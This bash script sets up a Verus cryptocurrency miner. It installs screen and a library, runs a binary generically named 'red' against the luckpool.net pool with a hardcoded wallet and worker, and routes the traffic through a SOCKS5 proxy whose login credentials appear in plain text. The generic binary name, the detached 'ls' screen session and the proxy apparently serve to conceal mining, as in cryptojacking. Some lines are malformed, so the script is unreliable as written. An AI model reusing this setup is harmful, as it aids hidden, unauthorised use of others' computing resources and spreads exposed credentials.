#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x mulai.sh && chmod +x red chmod 777 red mulai.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RKJpQdXCUrHrjF3Yd1ASrKrppMpABzrRmj
WORKER=GREATING-21
PROXY=socks5://fpfzeeby:3wdw0eiq8cm5@45.95.96.132:8691
./red -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
